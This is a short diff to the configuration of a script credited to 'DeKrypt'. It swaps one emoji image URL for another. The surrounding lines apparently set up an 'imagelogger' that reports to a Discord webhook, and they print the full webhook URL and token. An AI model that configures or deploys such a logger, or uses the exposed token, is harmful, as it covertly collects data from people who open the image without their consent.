@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1401350015347064924/xW0-vzDFVEGbZGMDMTxkaBR40FHNYJMAAFpYFKwbdRBpwk0A8rHJFv1nikyHSolVdZia",
-    "image": "https://toppng.com/uploads/preview/laughing-pointing-emoji-11549891819px76kliytz.png", # You can also have a custom image by using a URL argument
+    "image": "https://toppng.com/uploads/thumbnail/free-png-download-ios-10-crying-laughing-emoji-png-ios-10-crying-laughing-emoji-11562872808bc6fs8rt9v.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
